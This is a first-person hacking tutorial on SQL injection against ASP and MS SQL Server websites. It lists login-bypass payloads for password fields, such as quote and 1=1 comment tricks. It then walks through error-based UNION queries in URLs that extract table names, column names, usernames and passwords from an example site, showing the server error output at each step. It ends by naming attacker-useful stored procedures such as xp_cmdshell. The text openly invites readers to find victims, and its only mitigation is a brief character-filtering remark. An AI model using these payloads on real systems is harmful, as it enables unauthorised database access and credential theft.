Databases have been the heart of a commercial website. An attack on the database servers can cause a great monetary loss for the company 
. Database servers are usually hacked to get the credit card information. And just one hack on a commercial site will bring down its reputation and al 
so the customers as they also want their credit card info secured. Most of the commercial websites use Microsoft sql (MSsql) and Oracle database serve 
rs. MS sql still owns the market because the price is very low. While Oracle servers come with high price. Well some time ago Oracle had claimed itsel 
f to be "unbreakable" But hackers took it as a challenge and showed lots of bugs in it also !! I was addicted to hacking of database servers from a fe 
w months. So I just decided to share the knowledge with others. Well the things discussed here are not discovered by me ok. Yeah I experimented with t 
hem a lot. 
 
 user will type his login name and password in login.htm page and click the submit button. The value of the text boxes will be passed to the loginche 
ck.asp page where it will be checked using the query string. If it doesn't get an entry satisfying the query and will reach end of file a message of l 
ogin failed will be displayed. Every thing seems to be OK. But wait a minute. Think again. Is every thing really OK ?!! What about the query ?!! Is it 
 OK. Well if you have made a page like this then a hacker can easily login successfully without knowing the password. How ? Lets look at the querry ag 
ain. 
 
 
 
"Select * from table1 where login='"&log& "' and password='" &pwd& "' " 
 
Now if a user types his login name as "Chintan" and password as "h4x3r" then these values will pass to the asp page with post method and then the abo 
ve query will become 
 
"Select * from table1 where login=' Chintan ' and password=' h4x3r ' " 
 
Thats fine. There will be an entry Chintan and h4x3r in login and password fields in the database so we will receive a message as login successful. N 
ow what if I type loginname as "Chintan" and password as 
hi' or 'a'='a in the password text box ? The query will become as follows: 
 
"Select * from table1 where login=' Chintan ' and password=' hi' or 'a'='a ' " 
 
And submit and bingo!!!!! I will get the message as Login successful !! Did you see the smartness of hacker which was due to carelessness of web desi 
gner ? !! 
The query gets satisfied as query changes and password needs to 'hi' or 'a' needs to be equal to 'a'. Clearly password is not 'hi' but at the same ti 
me 'a'='a' . So condition is satisfied. And a hacker is in with login "Chintan" !! You can try the following in the password text box if the above doe 
sn't work for some websites: 
 
hi" or "a"="a 
hi" or 1=1 -- 
hi' or 1=1 -- 
hi' or 'a'='a 
hi') or ('a'='a 
hi") or ("a"="a 
 
Here above -- will make the rest of the query string to be a comment other conditions will not be checked. Similary you can provide 
 
Chintan ' -- 
Chintan " -- 
 
or such types of other possibilites in the login name textbox and password as anything which might let you in. Because in the query string only login 
 name is checked as "Chintan" and rest is ignored due to --. Well if you are lucky enough you get such a website were the webdesigner has done the abo 
ve mistake and then you will be able to login as any user !!! 
 
IMP NOTE: Hey guys I have put up a page where you can experiment for yourself about the sql injection vulnerablity. Just go to www33.brinkster.co

More advance hacking of Databases using ODBC error messages!!! 
-------------------------------------------------------------- 
 
Above we saw as to how login successfully without knowing password. Now over here I will show you how to read the whole database just by using querie 
s in the URL !! And this works only for IIS i.e asp pages. And we know that IIS covers almost 35% of the web market. So you will definitely get a vict 
im just after searching a few websites. You might have seen something like 
 
http://www.nosecurity.com/mypage.asp?id=45 
 
in the URLs. '?' over there shows that after it, 45 value is passed to a hidden datatype id. Well if you don't understand then as we have seen in the 
 above example in the login.htm, having two input text types with names 'login_name' and 'pass' and there values were passed to logincheck.asp page. T 
he same thing can be done by directly opening the logincheck.asp page using 
http://www.nosecurity.com/logincheck.asp?login_name=Chintan&pass=h4x3r 
in the URL if method="get" is used instead of method="post". 
 
Note : or Difference between get and post method is that post method doesn't show up values passed to next paged in the url while get method show 
s up the values. To get more understanding of how they internally work read HTTP protocol RFC 1945 and RFC 2616. 
 
What i mean to say is that after '?' the variables which are going to be used in that page are assigned the values. As above login_name is given valu 
e Chintan. And different variables are separated by operator '&'. 
 
OK so coming back, id will mostly be hidden type and according to the links you click its value will change. This value of id is then passed in the q 
uery in mypage.asp page and according tothe results you get the desired page at your screen. Now if just change the value of id as 46 then you will ge 
t different page. 
Now lets start our hacking the database. Lets use the magic of queries. Just type 
 
http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES-- 
 
in the URL. INFORMATION_SCHEMA.TABLES is a system table and it contains information of all the tables of the server. In that there is field TABLE_NAM 
E which contains names of all the tables. See the query again 
SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES 
The result of this query is the first table name from INFORMATION_SCHEMA.TABLES table. But the result we get is a table name which is a string(nvarch 
ar) and we are uniting it with 45(integer) by UNION. So we will get an error message as 
 
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error conve 
rting the nvarchar value 'logintable' to a column of data type int. /mypage.asp, line 
 
From the error its clear that first table is 'logintable'. It seems that this table might contain login names and passwords :-) So lets move in i 
t. Type the following in the URL 
 
http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='logintable'-- 
 
output 
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar 
value 'login_id' to a column of data type int. 
/index.asp, line 5 
 
The above error message shows that the first field or column in logintable is login_id. To get the next column name will type 
 
http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='logintable' WHERE COL 
UMN_NAME NOT IN ('login_id')-- 
 
Output: 
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar 
value 'login_name' to a column of data type int. 
/index.asp, line 5 
 
So we get one more field name as 'login_name'. To get the third field name we will write 
 
http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='logintable' WHERE COL 
UMN_NAME NOT IN ('login_id','login_name')-- 
 
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar 
value 'passwd' to a column of data type int. 
/index.asp, line 5 
 
Thats it. We ultimately get the 'passwd' field. Now lets get the login names and 
passwords from this table "logintable". Type 
 
http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 login_name FROM logintable-- 
 
Output: 
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar 
value 'Rahul' to a column of data type int. 
/index.asp, line 5 
 
Thats the login name "Rahul" and to get the password of Rahul the query would be 
 
http://www.nosecurity.com/mypage.asp?id=45 UNION SELECT TOP 1 password FROM logintable 
where login_name='Rahul'-- 
 
Output: 
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar 
value 'P455w0rd' to a column of data type int. 
/index.asp, line 5 
 
Voila!! login name: Rahul and password: P455w0rd. You have cracked the database of 
www.nosecurity.com And's it was possible to the request of user was not checked properly. SQL 
vulnerabilities still exist on many websites. The best solution is to parse the user requests and 
filter out some characters as ',",--,:,etc. 
 
Part II - using port 1434 (SQL Port) 
------------------------------------- 
 
Well uptill now we had seen how to break the database using the malformed URLs But that was done using just port 80 (http port) But this time we woul 
d use the port 1434 for hacking. Before that we will see what actually database servers are and how do they work and then how to exploit them ! 
 
The designers of MS sql gave some default stored procedures along with the product to make things flexible to the webdesigners. The procedure is noth 
ing but functions which can used to perform some actions on the arguments passed to them. This procedures are very important to hackers. Some of the i 
mportant ones are 
 
sp_passsword -> Changes password for a specific login name. 
e.g. EXEC sp_password 'oldpass', 'newpass', 'username' 
 
sp_tables -> Shows all the tables in the current database. 
e.g. EXEC sp_tables 
 
xp_cmdshell -> Runs arbitary command on the machine with administrator privileges. (most imp) 
 
xp_msver -> Shows the MS SQL server version including the all info about the OS. 
e.g. master..xp_msver
